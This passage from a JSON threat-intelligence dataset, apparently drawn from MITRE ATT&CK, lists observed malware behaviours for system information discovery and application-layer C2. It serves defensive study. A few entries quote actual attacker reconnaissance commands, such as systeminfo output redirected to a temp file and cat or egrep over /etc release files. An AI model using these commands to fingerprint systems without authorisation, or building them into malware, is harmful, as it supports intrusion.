      "can gather system information, the computer name, OS version, drive and serial information from the victim's machine.",
      "obtained OS version and hardware configuration from a victim.",
      "malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.",
      "collects the victim host name and serial number, and then sends the information to the C2 server.",
      "has run hostname and systeminfo on a victim.",
      "can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.",
      "has a tool that can obtain information about the local system.",
      "may collect information about the system by running hostname and systeminfo on a victim.",
      "checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.",
      "discovers information about the infected machine.",
      "collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.",
      "collects the system information, including hostname and OS version, and sends it to the C2 server.",
      "sends an OS version identifier in its beacons.",
      "executes systeminfo after initial communication is made to the remote server.",
      "can run  to gather information about the victim.",
      "gathers system configuration information.",
      "has a command to collect victim system information, including the system name and OS version.",
      "A module in  collects information from the victim about Windows OS version, computer name, battery info, and physical memory.",
      "can be used to gather information about the operating system.",
      "can be used to find information about the operating system.",
      "A system info module in  gathers information on the victim host’s configuration.",
      "has the ability to obtain a victim's system name and operating system version.",
      "contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.",
      "collects system information, including the operating system version and hostname.",
      "has the capability to execute ver, systeminfo, and gpresult commands.",
      "obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. Another  variant gathers the victim storage volume serial number and the storage device name.",
      "collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.",
      "contains a command to collect the victim PC name and operating system.",
      "gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.",
      "can obtain information about the OS, processor, and BIOS.",
      "collects the victim hostname, window resolution, and Microsoft Windows version.",
      "can gather the victim computer name.",
      "gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.",
      "has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.",
      "can obtain the computer name, OS version, and default language identifier.",
      "can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.",
      "extracts basic information about the operating system.",
      "is capable of retrieving information about the infected system.",
      "The initial beacon packet for  contains the operating system version and file system of the victim.",
      "can obtain information about the victim computer name, physical memory, country, and date.",
      "can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.",
      "has used  to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.",
      "The initial beacon packet for  contains the operating system version and file system of the victim.",
      "has the ability to enumerate system information.",
      "has commands to get information about the victim's name, build, version, serial number, and memory usage.",
      "obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.",
      "collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.",
      "is capable of gathering system information.",
      "During its initial execution,  extracts operating system information from the infected host.",
      "can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.",
      "sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.",
      "collects the computer name, OS versioning information, and OS install date and sends the information to the C2.",
      "has the ability to enumerate system information.",
      "collects information about the OS and computer name.",
      "The initial beacon packet for  contains the operating system version of the victim.",
      "A  file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.",
      "collected the victim computer name, OS version, and architecture type and sent the information to its C2 server.  also enumerated all available drives on the victim's machine.",
      "malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.",
      "Several  malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server.",
      "actors used the following commands after exploiting a machine with  malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download",
      "surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.",
      "performs operating system information discovery using systeminfo.",
      "gathers the hostname and OS version from the victims machine.",
      "enumerates the victim operating system and computer name during the initial infection.",
      "uses the Delphi methods Sysutils::DiskSize and GlobalMemoryStatusEx to collect disk size and physical memory as part of the malware's anti-analysis checks for running in a virtualized environment.  will gather various system information such as display adapter description operating system type and version processor type and RAM amount.",
      "gathers the OS version machine name CPU type amount of RAM available and UEFI/BIOS firmware information from the victims machine.",
      "can collect information about the about the system.",
      "checks for the systems Windows OS version and hostname.",
      "has the ability to use  to identify system information.",
      "can obtain information about the victim computer name physical memory country and date.",
      "can enumerate the OS version and domain on a targeted system.",
      "collects the MAC address computer name and CPU information.",
      "can obtain the OS version and build computer name and processor architecture from a compromised host.",
      "can determine whether the ISO payload was received by a Windows or iOS device.",
      "can enumerate the OS version and computer name on a targeted system.",
      "can enumerate local drives disk type and disk free space.",
      "collects system information including computer and domain names OS version and S7P paths.",
      "has used a script to detect which Linux distribution and version is currently installed on the system.",
      "uses the cat /proc/cpuinfo | grep -c cpu family 2>&1 command to gather system information.",
      "has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.",
      "can use `GetlogicalDrives` to get a bitmask of all drives available on a compromised system. It can also use `GetDriveType` to determine if a new drive is a CD-ROM drive.",
      "can gather extended system information such as information about the operating system disks and memory.",
      "has checked the language of the infected system using the GetUSerDefaultUILanguage function.",
      "has the ability to identify the Windows version on the compromised host.",
      "uses the GetSystemInfo Windows function to determine the number of processors on a victim machine.",
      "can collect the victim's operating system and computer name during the initial infection.",
      "has used a tool to capture the processor architecture of a compromised host in order to register it with C2.",
      "can enumerate volumes and collect system boot configuration and CPU information.",
      "has gathered victim computer information and configurations.",
      "uses multiple built-in commands such as systeminfo and `net config Workstation` to enumerate victim system basic configuration information.",
      "During   issued `ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+` commands to find the volume serial number of compromised systems.",
      "can enumerate local drives on a compromised host.",
      "has collected from a victim machine the system name processor information OS version and disk information including type and free space available.",
      "can gather the computer name of an infected host.",
      "has the ability to collect the computer name CPU manufacturer name and C:\\ drive serial number from a compromised machine.  also has the ability to execute the `ver` and `systeminfo` commands.",
      "will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion.",
      "can enumerate the CPUID and BIOS version on a compromised system.",
      "collected hostname and OS version.",
      "has gathered operating system information.",
      "has the ability to identify the system volume information of a compromised host.",
      "can collect information about a compromised computer including: Hardware UUID Mac serial number macOS version and disk sizes.",
      "A system info module in  gathers information on the victim hosts configuration.",
      "During its initial execution  extracts operating system information from the infected host.",
      "has collected the host name and operating system product name from a compromised machine.",
      "can gather the OS version architecture information connected drives hostname RAM size and disk space information from the victims machine and has used cmd /c systeminfo command to get a snapshot of the current system state of the target machine.",
      "has collected system information on the infected host.",
      "has the ability to identify hardware information the computer name and OS information on an infected host.",
      "During  the threat actors used  to obtain the compromised machine's name.",
      "has the ability to enumerate system information including the victim computer name.",
      "can collect the victim's computer name hostname and adapter information to create a unique identifier.",
      "has collected hardware details for the victim's system including CPU and memory information.",
      "can determine the system architecture it is running on to choose which version of the DLL to use.",
      "has collected the computer name and OS version from victim machines.",
      "can enumerate the targeted machine's name and GUID.",
      "has collected the hostname of a compromised machine.",
      "has commands to get information about the victim's name build version serial number and memory usage.",
      "During  the threat actors used the `systeminfo` command to gather details about a compromised system.",
      "can collect the local hostname operating system details CPU speed and total physical memory.",
      "can use `GetNativeSystemInfo` and `GetLogicalDrives` to enumerate system processors and logical drives.",
      "can collect the GUID of a targeted machine.",
      "can discover logical drive information including the drive type free space and volume information.",
      "retrieves the hard disk name by calling the CreateFileA to \\\\.\\PHYSICALDRIVE0 API.",
      "can determine the hostname and linux version on a compromised host.",
      "can collect and send OS version and computer name as a part of its C2 beacon.",
      "collects OS information and the computer name from the victims machine.",
      "collects the machine name and keyboard language from the system.",
      "can enumerate the OS version and hostname of a targeted machine.",
      "has collected the hostname OS version service pack version and the processor architecture from the victims machine.",
      "can obtain current system information from a compromised machine such as the `SHELL PID` `PSVERSION` `HOSTNAME` `LOGONSERVER` `LASTBOOTUP` drive information OS type/version bitness and hostname.",
      "collects the system name OS version including service pack and system install date and sends the information to the C2 server.",
      "can enumerate a victim computer's volume serial number and host name.",
      "has collected system information prior to downloading malware on the targeted host.",
      "can retrieve the following information from an infected machine: OS architecture computer name OS build version environment variables and storage drives.",
      "can gather the hostname on a compromised machine.",
      "has collected local host information by utilizing Windows commands `systeminfo` `fsutil` and `fsinfo`.  has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information.",
      "has used uname -m to collect the name and information about the infected system's kernel.",
      "has discovered the OS version CPU model and RAM size of the system it has been installed on.",
      "has the ability to query device information.",
      "can gather system information the computer name OS version drive and serial information from the victim's machine.",
      "can collect compromised host information including OS version PC name RAM size and CPU details.",
      "collects the victim host name and serial number and then sends the information to the C2 server.",
      "can enumerate host system information like OS architecture domain name applied patches and more.",
      "can obtain the computer name and UUID and enumerate local drives.",
      "can collect the OS version architecture information and computer name.",
      "gathers computer names OS version info and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.",
      "collects the computer name the BIOS model and execution path.",
      "can obtain the computer name from the victim's system.",
      "has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server.  executed shellcode to identify the name of the infected host.",
      "can check the disk size through the values obtained with `DeviceInfo.`",
      "can identify the system name of a compromised host.",
      "can collect CPU and architecture information from the victims machine.",
      "can gather system information from the victims machine including the OS type.",
      "can obtain system information by querying the `Win32_ComputerSystem` `Win32_BIOS` `Win32_MotherboardDevice` `Win32_PnPEntity` and `Win32_DiskDrive` WMI objects.",
      "can use `uname` to identify the operating system name version and processor type.",
      "has the capability to execute ver and systeminfo commands.",
      "has used the systeminfo command on a compromised host.",
      "has used a reconnaissance module to gather information about the operating system and hardware on the infected host.",
      "collects the victims computer name processor architecture OS version volume serial number and system type.",
      "creates a backdoor through which remote attackers can retrieve information such as computer name OS version processor speed memory size and CPU speed.",
      "contains a command to collect the victim PC name disk drive information and operating system.",
      "collects the OS version computer name and language ID.",
      "can retrieve the hostname of a compromised host.",
      "collects information about the OS (version build type install date) as well as system up-time upon receiving a connection from a backdoor.",
      "can identify the OS version CPU and other details from a victim's machine.",
      "Several  malware families collect information on the type and version of the victim OS as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server.",
      "can collect the user name Windows version computer name and available space on discs from a compromised host.",
      "has discovered file system types drive names size and free space on compromised systems.",
      "collects the OS system OS version MAC address and the computer name from the victims machine.",
      "has the ability to list drives and obtain the computer name of a compromised host.",
      "collects hostname volume serial number and OS version data from the victim and sends the information to its C2 server.",
      "collected information about the infected host including the machine names and OS architecture.",
      "can collect system profile information from a compromised host.",
      "collects the computer name OS versioning information and OS install date and sends the information to the C2.",
      "gathers system information network addresses disk type disk free space and the operation system version.",
      "has checked the OS version using `wmic.exe` and the `find` command.",
      "has the capability to collect the computer name language settings the OS version CPU information disk devices and time elapsed since system start.",
      "collects processor information memory information computer name hardware UUID serial number and operating system version.  has used the ioreg command to gather some of this information.",
      "can identify the username machine name system language keyboard layout OS version and system drive information on a compromised host.",
      "contains modules such as Get-ComputerInfo for enumerating common system information.",
      "can capture information regarding the victim's OS security and hardware configuration.",
      "can detect the computer name operating system and drive information including drive type total number of bytes on disk total number of free bytes on disk and name of a specified volume.",
      "gathers the name of the local host version of GNU Compiler Collection (GCC) and the system information about the CPU machine and operating system.",
      "can collect operating system (OS) version information processor information system name and information about installed disks from the victim.",
      "can identify the computer name of a compromised host.",
      "collects the computer name of the victim's system during the initial infection.",
      "can obtain the victim PC name and OS version.",
      "will attempt to enumerate Windows version and system architecture.",
      "has the ability to identify the hostname computer name Windows version processor speed machine GUID and disk information on a compromised host.",
      "collects the OS version computer name and serial number for the storage volume C:\\.  also runs the systeminfo command to gather system information.",
      "can collect the computer name RAM used and operating system version from the victims machine.",
      "has captured victim computer name memory space and CPU details.",
      "collected the system volume serial number GUID and computer name.",
      "collects the OS version hardware information computer name available system memory status disk space information and system and user language settings.",
      "has used a reconnaissance module that can be used to retrieve information about a victim's computer including the resolution of the workstation .",
      "collects the CPU information OS information and system language.",
      "can collect system information including computer name system manufacturer IsDebuggerPresent state and execution path.",
      "can collect the computer name and OS version from a compromised host.",
      "can enumerate drives on a compromised host.",
      "can enumerate the host name and OS version on a target system.",
      "has a command to collect the processor type operation system computer name and whether the system is a laptop or PC.",
      "checks for information on the CPU fan temperature mouse hard disk and motherboard as part of its anti-VM checks.",
      "can use `DsRoleGetPrimaryDomainInformation` to determine the role of the infected machine.  can also halt execution if the compromised host is identified as a domain controller.",
      "collects the machine information system architecture the OS version computer name and Windows product name.",
      "has the ability to query `Win32_ComputerSystem` for system information.",
      "has collected the system architecture OS version and MAC address information.",
      "conducts multiple system checks and includes these in subsequent heartbeat messages to the malware's command and control server.",
      "can collect computer name locale information and information about the OS and architecture.",
      "can obtain the computer name and information on the OS and physical drives from targeted hosts.",
      "has the ability to check whether the infected systems OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.",
      "has collected the victim host information after infection.",
      "gathers the victim computer name using the Win32 API call GetComputerName.",
      "can gather the device serial number and has checked to ensure there is enough disk space using the Unix utility `df`.",
      "can obtain the victim hostname Windows version RAM amount number of drives and screen resolution.",
      "can collect system drive information the computer name the size of the disk OS version and OS architecture information.",
      "can collect the hostname operating system configuration product ID and disk space on victim machines by executing .",
      "has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.",
      "can enumerate the hostname domain and IP of a compromised host.",
      "has the ability to gather information about the compromised host.",
      "can identify the OS version of a targeted system.",
      "has the ability to check for blocklisted computer names on infected endpoints.",
      "can obtain the computer name from a compromised host.",
      "A module in  collects information from the victim about Windows OS version computer name battery info and physical memory.",
      "has been observed collecting victim machine information like OS version volume information and more.",
      "can determine the Windows version and computer name on a compromised host.",
      "gathers the victim's computer name Windows version and system language and then sends it to its C2 server.",
      "can grab a systems information including the OS version architecture etc.",
      "can collect the hostname keyboard layout and language from the system.",
      "has collected the host's OS CPU and memory information.",
      "has used a file stealer that can examine system drives including those other than the C drive.",
      "can detect system information--including disk names total space and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.",
      "has used the command ls /etc | egrep -efedora\\*|debian\\*|gentoo\\*|mandriva\\*|mandrake\\*|meego\\*|redhat\\*|lsb-\\*|sun-\\*|SUSE\\*|release to determine which Linux OS version is running.",
      "obtains victim Microsoft Windows version information and CPU architecture.",
      "has the ability to identify the OS version OS bit information and computer name.",
      "has the ability to gather the hostname of the victim machine.",
      "can determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.",
      "has attempted to get detailed information about a compromised host including the operating system version patches hotfixes and service packs.",
      "has the ability to gather the victim's computer name.",
      "can determine the OS version bitness and enumerate physical drives on a targeted host.",
      "executes a set of commands to collect device information including `uname`. Another example is the `cat /etc/*release | uniq` command used to collect the current OS distribution.",
      "has gathered system information using systeminfo.",
      "can collect the computer name from the system.",
      "can collect a system's architecture operating system version hostname and drive information.",
      "uses systeminfo on a victims machine.",
      "has collected the hostname and operating system version from the compromised host.",
      "can discover the hostname computer name and Windows version of a targeted machine.",
      "During  the threat actors collected the computer name OS and other system information using `cmd /c systeminfo > %temp%\\ temp.ini`.",
      "has collected the Service Pack language and region information to send to the C2.",
      "has the capability to gather the systems hostname and OS version.",
      "can determine if the OS on a compromised host is newer than Windows XP.",
      "has executed the ver command.",
      "can gather information on the mapped drives OS version computer name DEP policy memory size and system volume serial number.",
      "can collect the computer name and enumerate all drives on a compromised host.",
      "has the capability to discover the system OS Windows version architecture and environment.",
      "collects the OS version country name MAC address computer name physical memory statistics and volume information for all drives on the system.",
      "has enumerated drives OS type OS version and other information using a script or the systeminfo command.",
      "has the ability to collect the hostname and OS information from an infected host.",
      "can enumerate logical drives on a target system.",
      "can obtain the OS version information computer name processor architecture machine role and OS edition.",
      "can collect the OS version architecture and machine name to create a unique token for the infected host.",
      "has the ability to identify the computer name and Windows version of an infected host.",
      "has used malware that can collect the victims OS version and machine name.",
      "has called GetLogicalDrives to emumerate all mounted drives and GetDriveTypeW to determine the drive type.",
      "has collected the IOPlatformUUID session UID and the OS version using the command sw_vers -productVersion.",
      "has collected the computer name and OS architecture information from the system.",
      "has monitored CPU usage.",
      "has checked the system settings to see if Arabic is the configured language.",
      "collects the system information including hostname and OS version and sends it to the C2 server.",
      "has a command to upload to its C2 server victim mobile device information including IMEI IMSI SIM card serial number phone number Android version and other information.",
      "collects the victim hostname window resolution and Microsoft Windows version.",
      "has the ability to gather basic system information and run the POSIX API `gethostbyname`.",
      "has searched for system version architecture disk partition logical volume and hostname information.",
      "has collected the computer name and OS version from a compromised machine.",
      "can identify the hard disk volume serial number on a compromised host.",
      "has the ability to send system volume information to C2.",
      "collects OS version information such as registered owner details manufacturer details processor type available storage installed patches hostname version info system date and other system information by using the commands systeminfo net config workstation hostname ver set and date /t.",
      "can gather extended system information including the hostname OS version number platform memory information time elapsed since system startup and CPU information.",
      "has the ability to discover the computer name and Windows product name/version.",
      "can collect the computer name from the machine.",
      "gathers the computer name the serial number of the main disk volume CPU information Microsoft Windows version and runs the command systeminfo.",
      "can collect the computer name system architecture default language and processor frequency of a compromised host.",
      "has gathered system architecture processor OS configuration and installed hardware information.",
      "During the   used `fsutil` to check available free space before executing actions that might create large files on disk.",
      "gathers the OS version logical drives information processor information and volume information.",
      "has used tools to collect the computer name OS version installed hotfixes as well as information regarding the memory and processor on a compromised host.",
      "can discover logical drive information on compromised hosts.",
      "can collect information about the drives available on the system.",
      "can collect the system's computer name and also has the capability to collect information on the processor memory OS and video card from the system.",
      "has the ability to enumerate fixed logical drives on a targeted system.",
      "malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version UUID and computer/host name to send to the C2 server.",
      "has a module to gather information from the compromrised asset including the computer version computer name IIS version and more.",
      "has used  to gather system information.",
      "During  threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model as well as the OS versions of systems connected to a targeted network.",
      "can enumerate attached drives.",
      "has the ability to collect information such as computer name computer manufacturer BIOS operating system and firmware including through the use of `systeminfo.exe`.",
      "has collected the computer name from the infected host.",
      "can collect the OS version and computer name from a compromised host.",
      "can use a plugin to enumerate system drives.",
      "has the ability to identify the computer name OS version and hardware configuration on a compromised host.",
      "has identified the OS version of a compromised host.",
      "During  threat actors used the ENUM4LINUX Perl script for discovery on Windows and Samba hosts.",
      "has used `fsutil fsinfo drives` `systeminfo` and `vssadmin list shadows` for system information including shadow volumes and drive information.",
      "has the ability to discover the hostname of a compromised host.",
      "collected system architecture information.  used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victims machine.",
      "can enumerate the system drives and associated system name.",
      "can collect system information from the victims machine.",
      "can collect the hostname Microsoft Windows version and processor architecture from a victim machine.",
      "can use GET.WORKSPACE in Microsoft Excel to determine the OS version of the compromised host.",
      "gathered the operating system name and specific Windows version of an infected machine.",
      "can obtain the computer name OS version and default language identifier.",
      "has the ability to collect the hostname OS version and OS architecture of an infected host.",
      "has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.",
      "The  Server Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary.",
      "identifies the macOS version and uses ioreg to determine serial number.",
      "can collect the computer name and OS version from the system.",
      "has detected a target systems OS version and system volume information.",
      "has used commands and API calls to gather system information.",
      "has used native OS commands to understand privilege levels and system details.",
      "can gather the hostname and the OS version to ensure it doesnt run on a Windows XP or Windows Server 2003 systems.",
      "collects the victim machines Windows GUID.",
      "has discovered system information including memory status CPU frequency OS versions and volume serial numbers.",
      "can identify drives on compromised hosts and retrieve the hostname via `gethostbyname`.",
      "can collect system information including the OS version and domain on a compromised host.",
      "can obtain information about the OS processor and BIOS.",
      "can collect the computer name of a targeted system.",
      "can gather system information from a compromised host.",
      "has the ability to discover information about the compromised host.",
      "collects the hostname of the target computer.",
      "gathers BIOS versions and manufacturers the number of CPU cores the total physical memory and the computer name.",
      "can retrieve system information including OS version memory usage local hostname and system adapter information.",
      "collects the OS version system architecture computer name product ID install date and information on the keyboard mapping to determine the language used on the system.",
      "has collected the operating system version from the infected system.",
      "can collect drive information from a compromised host.",
      "has the ability to identify the IP address machine name and OS of the compromised host.",
      "can enumerate disk volumes get disk information and query service status.",
      "has used implants to perform system reconnaissance on targeted systems.",
      "has checked for the presence of Arabic language in the infected machine's settings.",
      "can use DriveList to retrieve drive information.",
      "has used  and similar commands to acquire detailed configuration information of a victim's machine.  has also utilized the PowerShell cmdlet `Get-ADComputer` to collect DNS hostnames last logon dates and operating system information from Active Directory.",
      "can report the file system type and disk space of a compromised host to C2.",
      "has the ability to determine if the current user is an administrator Windows product name processor name screen resolution and physical RAM of the infected host.",
      "can collect the machine information system architecture the OS version computer name Windows product name the number of CPU cores video card information and the system language.",
      "collected the victim computer name OS version and architecture type and sent the information to its C2 server.  also enumerated all available drives on the victim's machine.",
      "has used malware to identify the computer name of a compromised host.",
      "collects system information including the operating system version and hostname.",
      "collects the OS name machine name and architecture information.",
      "can gather system information such as computer names.",
      "can collect the OS version system architecture and computer name.",
      "has a command to collect victim system information including the system name and OS version.",
      "collects system information from the victim including CPU speed computer name volume serial number ANSI code page OEM code page identifier for the OS Microsoft Windows version and memory information.",
      "has collected system information including the machine name and OS version.",
      "can collect the OS and build version on a compromised host.",
      "can gather information on drives and the operating system on the victims machine.",
      "has used  to gather the OS version as well as information on the system configuration BIOS the motherboard and the processor.",
      "has collected information on bootable drives including model vendor and serial numbers.",
      "malware gathers system information via WMI including the system directory build number serial number version manufacturer model and total physical memory.",
      "can record the hostname and kernel version of the target machine.",
      "can perform a language check of the infected system and can query the CPU information (cupid).",
      "can enumerate all logical drives on a targeted machine.",
      "can identify system information including battery status.",
      "has the ability to identify the computer name and OS version on a compromised host.",
      "gathers information about the OS architecture OS name and OS version/Service pack.",
      "can check the type of Ivanti VPN device it is running on by executing `first_run()` to identify the first four bytes of the motherboard serial number.",
      "can fingerprint architecture computer name and OS version on the compromised host.  can also check if the Russian language is installed on the infected machine and terminate if it is found.",
      "used a backdoor to enumerate information about the infected system's operating system.",
      "performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name.",
      "has collected system name OS version adapter information memory usage and disk information from a victim machine.",
      "has the ability to list local drives and enumerate the OS architecture.",
      "can gather system information from the victims machine such as the OS version machine name and drive information.",
      "has the ability to enumerate various information such as the operating system and host name for systems within a domain.",
      "monitors the free disk space on the system.",
      "can collect information related to a compromised host including OS version and a list of drives.",
      "sends information to its hard-coded C2 including OS version service pack information processor speed system name and OS install date.",
      "has the ability to identify the host volume ID and the OS architecture on a compromised host.",
      "can collect the computer name from a compromised host.",
      "During  the threat actors used  to collect information on targeted hosts.",
      "can execute getinfo to enumerate the computer name and OS version of a compromised system.",
      "can use the `IOCTL_DISK_GET_DRIVE_GEOMETRY_EX` `IOCTL_DISK_GET_DRIVE_GEOMETRY` and `IOCTL_DISK_GET_LENGTH_INFO` system calls to compute disk size.",
      "can use WMI queries and shell commands such as systeminfo.exe to collect the operating system BIOS version and domain name of the targeted system.",
      "performs basic system profiling actions to fingerprint and register the victim system with the C2 controller.",
      "performs several system checks as part of anti-analysis mechanisms including querying the operating system build number processor vendor and type video controller and CPU temperature.",
      "deploys information gathering tools focused on capturing IP configuration running application system information and network connectivity information.",
      "can discover and mount hidden drives to encrypt them.",
      "implants can gather basic information on infected systems.",
      "performs a variety of system checks and gathers system information including commands such as whoami.",
      "uses WMI queries to gather information about the victim machine.",
      "can inspect the User-Agent string in GET request header information to determine the operating system of targeted systems.",
      "has collected information about the target system such as system information and list of network connections.",
      "can enumerate logical drives on targeted devices.",
      "can gather operating system information.",
      "utilizes victim machine operating system information to create custom User Agent strings for subsequent command and control communication.",
      "can capture environmental variables on compromised hosts.",
      "has leveraged tools to enumerate system information.",
      "script execution includes basic victim information gathering steps which are then transmitted to command and control servers.",
      "reads the value of the infected system's `HKLM\\SYSTEM\\Microsoft\\Cryptography\\MachineGUID` value.",
      "gathers information on the victim system such as CPU and Computer name as well as device drivers.  can also collect information about disk drives their total and free space and file system type.",
      "includes use of native system tools such as uname to obtain information about victim device architecture as well as gathering other system information such as the victim's hosts file and CPU utilization.",
      "gathers information on infected systems such as operating system processor information RAM and display information.",
      "can gather information about the OS version and hardware on compromised hosts.",
      "has gathered information on victim systems.",
      "uses the Delphi methods Sysutils::DiskSize and GlobalMemoryStatusEx to collect disk size and physical memory as part of the malware's anti-analysis checks for running in a virtualized environment.  will gather various system information such as domain display adapter description operating system type and version processor type and RAM amount.",
      "used various system commands and tools to pull system information during operations.",
      "uses WMI queries to gather various information about the victim machine and operating system.",
      "can identify the compromised system's hostname which is used to create a unique identifier.",
      "utilizes WinAPI calls and registry queries to gather system information.",
      "performed host enumeration and data gathering operations on victim machines during .",
      "can collect the machine name of a compromised system which is later used as part of a unique victim identifier.",
      "captured victim operating system type via User Agent analysis during .",
      "can enumerate system information including hostname domain information and local drive configuration.",
      "second stage implant uses the `DeviceInformation` class to collect system information including CPU usage battery statistics memory allocations screen size etc.",
      "gathers information from the infected system such as hostname.",
      "gathers victim system information to generate a unique victim identifier.",
      "can identify various system locations and mapped devices on Linux systems as a precursor to wiping activity.",
      "can send basic information about the infected host to C2.",
      "can enumerate system hostname domain and local drive configuration.",
      "can enumerate the computer name and domain membership of the compromised system.",
      "can create unique victim identifiers by using the compromised systems volume ID or computer name.",
      "can collect local system information.",
      "During   used a script to send the name of the compromised host via HTTP `POST` to register it with C2.",
      "has a module to gather information from the compromised asset including the computer version computer name IIS version and more.",
      "collects basic system information from victim machines.",
      "has used malware such as GHAMBAR and POWERPOST to collect system information.",
      "performs system survey actions following initial execution.",
      "can collect system information and supported language information from the victim machine.",
      "collects information on infected systems such as hostname username CPU and RAM information.",
      "variants collect victim system information for exfiltration.",
      "included collection of victim device configuration information.",
      "can gather system configuration information by running the native `show configuration` command.",
      "can retrieve information about virtual machines.",
      "has gathered various system information from victim machines."
    ],
    "id": "T1082",
    "name": "System Information Discovery",
    "similar_words": [
      "System Information Discovery"
    ]
  },
  "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6": {
    "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22) ",
    "example_uses": [
      "has performed C2 using DNS via A, OPT, and TXT records.",
      "malware has used HTTP for C2.",
      "has used HTTP and HTTPS for C2 communications.",
      "uses HTTP for C2 communications.",
      "uses HTTP for C2 communications.",
      "uses HTTP for C2 communications.",
      "uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.",
      "has used HTTPS and DNS tunneling for C2. The group has also used the Plink utility to create SSH tunnels.",
      "used SMB for C2.",
      "used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.",
      "uses HTTPS to conceal C2 communications.",
      "uses FTP for command and control.",
      "Some  variants have used South Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.",
      "uses HTTP for command and control communication.",
      "uses DNS for the C2 communications.",
      "malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2. Additionally,  malware RoyalDNS has used DNS for C2.",
      "uses HTTP for communication to the control servers.",
      "uses HTTP and HTTPS to communicate with the C2 server.",
      "uses HTTP for command and control.",
      "uses HTTPS for C2 communications.",
      "uses HTTPS for C2.",
      "use HTTPS for all command and control communication methods.",
      "version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”",
      "uses HTTP for communication with the C2 server.",
      "has used HTTP for C2.",
      "uses HTTP for C2 communication.",
      "uses HTTPS for command and control.",
      "uses the email platform, Naver, for C2 communications, leveraging SMTP.",
      "has used HTTP for C2, including sending error codes in Cookie headers.",
      "uses HTTPS, HTTP, and DNS for C2 communications.",
      "uses HTTP over SSL to communicate commands with the control server.",
      "uses HTTP/HTTPS for command and control communication.",
      "uses HTTP for C2.",
      "After using raw sockets to communicate with its C2 server,  uses a decrypted string to create HTTP POST requests.",
      "uses HTTP, HTTPS, FTP, and FTPS to communicate with the C2 server.  can also act as a webserver and listen for inbound HTTP requests through an exposed API.",
      "uses HTTP for C2 communications.",
      "uses HTTP for C2.",
      "has used HTTP for C2.",
      "uses HTTP for C2 communications.",
      "A  malware sample conducts C2 over HTTP.",
      "establishes a backdoor over HTTP.",
      "has exfiltrated data in HTTP POST headers.",
      "uses HTTP for C2.",
      "creates a backdoor by making a connection using a HTTP POST.",
      "enables remote interaction and can obtain additional code over HTTPS GET and POST requests.",
      "has used HTTP for C2.",
      "provides access to the system via SSH or any other protocol that uses PAM to authenticate.",
      "can communicate over HTTP for C2.",
      "executes code using HTTP POST commands.",
      "can communicate over FTP and send email over SMTP.",
      "has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks.",
      "malware has used HTTP for C2.",
      "uses HTTP for C2.",
      "has used HTTP and DNS for C2. The group has also used the Plink utility and other tools to create tunnels to C2 servers.",
      "can use HTTP or DNS for C2.",
      "uses DNS for C2.",
      "communicates to its C2 server over HTTP.",
      "uses RDP to tunnel traffic from a victim environment.",
      "malware has used HTTP and IRC for C2.",
      "communicates with its C2 servers over HTTP.",
      "Some  variants use HTTP for C2.",
      "uses HTTP for C2.",
      "can use HTTP and DNS for C2 communications.",
